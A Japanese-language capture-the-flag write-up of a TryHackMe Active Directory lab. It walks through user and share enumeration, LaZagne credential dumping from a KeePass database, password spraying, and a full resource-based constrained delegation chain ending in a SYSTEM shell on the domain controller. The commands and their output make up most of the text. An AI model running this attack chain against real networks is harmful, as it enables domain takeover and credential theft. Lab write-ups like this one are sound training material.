# Forward CTF

https://tryhackme.com/room/forwardchallenge

## 接続情報

接続情報が最初から与えられている。

```
USER > ctf.local\j.smith
PASS > JSmith@IT2024
```

SMB, RDP で認証可能。実際にリモートデスクトップ接続できた。

```sh
$ nxc winrm $TARGET -u 'j.smith' -p 'JSmith@IT2024'
nxc rdp $TARGET -u 'j.smith' -p 'JSmith@IT2024'
nxc smb $TARGET -u 'j.smith' -p 'JSmith@IT2024'
RDP         10.144.185.173  3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:ctf.local) (nla:False)
RDP         10.144.185.173  3389   DC01             [+] ctf.local\j.smith:JSmith@IT2024 (Pwn3d!)
SMB         10.144.185.173  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.144.185.173  445    DC01             [+] ctf.local\j.smith:JSmith@IT2024
```

## Enumeration

ほかのユーザー

```sh
C:\Users\j.smith>net users /domain

User accounts for \\DC01

-------------------------------------------------------------------------------
Administrator            j.smith                  krbtgt
r.williams
The command completed successfully.
```

```sh
$ nxc ldap $TARGET -u 'j.smith' -p 'JSmith@IT2024' --users
LDAP        10.144.185.173  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:ctf.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.144.185.173  389    DC01             [+] ctf.local\j.smith:JSmith@IT2024 
LDAP        10.144.185.173  389    DC01             [*] Enumerated 7 domain users: ctf.local
LDAP        10.144.185.173  389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                                                                                            
LDAP        10.144.185.173  389    DC01             Administrator                 2026-05-19 23:03:45 0        Built-in account for administering the computer/domain                                                                   
LDAP        10.144.185.173  389    DC01             Guest                         2026-05-19 22:24:15 1        Built-in account for guest access to the computer/domain                                                                 
LDAP        10.144.185.173  389    DC01             krbtgt                        2026-05-19 23:04:18 0        Key Distribution Center Service Account                                                                                  
LDAP        10.144.185.173  389    DC01             j.smith                       2026-05-19 23:29:49 0        IT Staff                                                                                                                 
LDAP        10.144.185.173  389    DC01             t.jones                       2026-05-19 23:29:49 0        Help Desk                                                                                                                
LDAP        10.144.185.173  389    DC01             r.williams                    2026-05-19 23:29:49 0        Help Desk Senior                                                                                                         
LDAP        10.144.185.173  389    DC01             svc.helpdesk                  2026-05-20 14:35:56 11       HelpDesk Service Acct
```

Downloads 共有が存在するが、使えるかは不明。  
C:\Downloads に対応していると思われる。

```sh
$ smbclient -L //$TARGET -U "j.smith"              
Password for [WORKGROUP\j.smith]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Downloads       Disk      File drop share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.144.185.173 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

$ smbclient //$TARGET/Downloads -U "j.smith"
Password for [WORKGROUP\j.smith]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed May 20 06:32:25 2026
  ..                                  D        0  Wed May 20 06:32:25 2026

                7863807 blocks of size 4096. 3580083 blocks available
```

PrivescCheck の結果、即利用可能なものはなかった。

```sh
PS C:\Users\j.smith\Desktop> Invoke-PrivescCheck >check.txt
WARNING: Service: vwifibus | Path not found: C:\Windows\System32\drivers\vwifibus.sys
WARNING: NtOpenSymbolicLinkObject('\Device\BootDevice') - Access is denied (5)
WARNING: Check 'Credentials - Vault (creds)' is categorized as risky, but the option '-Risky' was not specified,
ignoring...
WARNING: Check 'Credentials - Vault (list)' is categorized as risky, but the option '-Risky' was not specified,
ignoring...
WARNING: TpmGetDeviceInformation KO 0x8028400F
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                 ~~~ PrivescCheck Summary ~~~                 ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 TA0004 - Privilege Escalation
 - Updates - Update History → Medium
 TA0006 - Credential Access
 - Hardening - Credential Guard → Low
 - Hardening - LSA Protection → Low
 TA0008 - Lateral Movement
 - Hardening - LAPS → Medium

WARNING: To get more info, run this script with the option '-Extended'.
```

## Bloodhound

```sh
$ bloodhound-python -u j.smith -p JSmith@IT2024 -d ctf.local -ns $TARGET -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: ctf.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.ctf.local:88)] [Errno 110] Connection timed out
INFO: Connecting to LDAP server: dc01.ctf.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.ctf.local
INFO: Found 8 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.ctf.local
INFO: Done in 00M 26S
INFO: Compressing output into 20260716204054_bloodhound.zip
```

グラフを見ると次の関係。

- r.williams から Administrator のパスは存在する。
- j.smith から r.williams へのパスは存在しない。

Database.kdbx, Automation-Notice.txt を発見。txtファイルは読む権限がない。

```sh
C:\Users>tree /A /F
Folder PATH listing
Volume serial number is A8A4-C362
C:.
+---Administrator
+---j.smith
|   +---3D Objects
|   +---Contacts
|   +---Desktop
|   |       check.txt
|   |       PrivescCheck.ps1
|   |
|   +---Documents
|   |       Database.kdbx
|   |
|   +---Downloads
|   +---Favorites
|   |   |   Bing.url
|   |   |
|   |   \---Links
|   +---Links
|   |       Desktop.lnk
|   |       Downloads.lnk
|   |
|   +---Music
|   +---Pictures
|   +---Saved Games
|   +---Searches
|   \---Videos
+---Public
|   +---Documents
|   +---Downloads
|   +---Music
|   +---Pictures
|   \---Videos
+---r.williams
|   \---Desktop
|           Automation-Notice.txt
|
+---r.williams.CTF
\---svc.scanner
```

kdbx は rockyou でクラックしようとしたが、数分待って途中であきらめた。  
ログインパスワードでも開けなかった。

```sh
$ snap run john-the-ripper.keepass2john Database.kdbx > hash

sudo chown kali:kali rockyou.txt && sudo chmod 664 rockyou.txt && ls -l hash rockyou.txt

snap run john-the-ripper hash --wordlist=rockyou.txt --format=KeePass
-rw-rw-r-- 1 kali kali       653 Jul 16 21:21 hash
-rw-rw-r-- 1 kali kali 139921507 Jul 16 21:20 rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 512/512 AVX512F])
Cost 1 (t (rounds)) is 600000 for all loaded hashes
Cost 2 (m) is 0 for all loaded hashes
Cost 3 (p) is 0 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 3 for all loaded hashes
Will run 4 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
0g 0:00:04:16 0.58% (ETA: 09:33:49) 0g/s 390.4p/s 390.4c/s 390.4C/s romeo14..rokerita
Session aborted
```

わからなかったのでウォークスルーを見た。

https://github.com/AlessandroZ/LaZagne を使うと、kdbxファイルがNTLMで開けることがわかる。  
WindowsにKeePassアプリがインストールされており、それを開くと t.jones のパスワードを入手できた。

```ps
PS C:\Users\j.smith\Desktop> .\LaZagne.exe

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: j.smith ##########

------------------- Keepassconfig passwords -----------------

[+] Keyfile found !!!
Keyfile: No keyfile found
Database: C:\Users\j.smith\Documents\Database.kdbx
Type: NTLM


[+] 1 passwords have been found.
For more information launch it again with the -v option

elapsed time = 2.562507390975952
```

## t.jones

今度は何も出ない。

```sh
PS C:\Users\t.jones\Desktop> .\LaZagne.exe

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


[+] 0 passwords have been found.
For more information launch it again with the -v option

elapsed time = 1.017226219177246
```

なにも手掛かりが見つからなかった。

t.jones のパスワードでパスワードスプレーを実行すると、r.williams でも認証されることがわかる。

```sh
$ nxc smb $TARGET -u users.txt -p '[REDACTED]' --continue-on-success
SMB         10.144.185.173  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.144.185.173  445    DC01             [+] ctf.local\r.williams:[REDACTED] 
SMB         10.144.185.173  445    DC01             [+] ctf.local\t.jones:[REDACTED] 
SMB         10.144.185.173  445    DC01             [-] ctf.local\j.smith:[REDACTED] STATUS_LOGON_FAILURE 
SMB         10.144.185.173  445    DC01             [+] ctf.local\:[REDACTED] (Guest)
```

## r.williams

ファイル履歴に、`HelpDesk-Auth.b64` というファイルがあった。  
デコードしたが何のファイルなのかは不明。

前に発見したが読めなかった Automation-Notice.txt を読めた。

```txt
HelpDesk Automation Notice
==========================
A background process handles automatic ticket processing and
service account maintenance for the HelpDesk system.

The automation runs periodically and stores temporary working
files in C:\Windows\Temp.

Contact the sysadmin team if you notice any issues.
-- IT Operations
```

さっきの base64 ファイルとログファイルが入っていた。ログファイルは開けない。

```sh
C:\Windows\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Windows\Temp

07/17/2026  12:46 AM    <DIR>          .
07/17/2026  12:46 AM    <DIR>          ..
05/20/2026  06:35 PM             1,680 HelpDesk-Auth.b64
07/17/2026  12:31 AM               102 silconfig.log
               2 File(s)          1,782 bytes
               2 Dir(s)  14,556,008,448 bytes free
```

このファイルが何なのかは不明だが、BloodHound で表示されていた AddAllowedToAct を狙う。

## Resource-Based Constrained Delegation (RBCD)

```sh
$ addcomputer.py -method SAMR -dc-ip $TARGET -computer-name 'ATTACKVM' -computer-pass 'Password123!' 'ctf/r.williams:[REDACTED]'
Impacket v0.14.0.dev0+20260708.160148.cbcf4f86 - Copyright Fortra, LLC and its affiliated companies 

[!] No DC host set and 'ctf' doesn't look like a FQDN. DNS resolution of short names will probably fail.
[*] Successfully added machine account ATTACKVM$ with password Password123!.
```

```sh
$ rbcd.py -dc-ip $TARGET -delegate-from 'ATTACKVM$' -delegate-to 'DC01$' -action 'write' 'ctf.local/r.williams:[REDACTED]'
Impacket v0.14.0.dev0+20260708.160148.cbcf4f86 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKVM$ can now impersonate users on DC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKVM$    (S-1-5-21-1966530601-3185510712-10604624-3109)
```

```sh
$ getST.py -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' 'ctf.local/ATTACKVM$:Password123!'
Impacket v0.14.0.dev0+20260708.160148.cbcf4f86 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

```sh
$ export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
psexec.py -k -no-pass 'ctf.local/Administrator@DC01.ctf.local'
Impacket v0.14.0.dev0+20260708.160148.cbcf4f86 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.ctf.local.....
[*] Found writable share ADMIN$
[*] Uploading file liCCGVFZ.exe
[*] Opening SVCManager on DC01.ctf.local.....
[*] Creating service rsZv on DC01.ctf.local.....
[*] Starting service rsZv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```



## 振り返り

- LaZagne は初見。KeePassツールの今回の使い方も初見で良い勉強になった。
- あるパスワードが他のユーザーでも有効なパターンだったが見逃しがち。
- RBCD 自体は初見ではなかったが、AddAllowedToAct という文言をBloodHoundで見たのは初めて。

## Tags

#tags:Windows #tags:Kerberos #tags:LaZagne #tags:RBCD
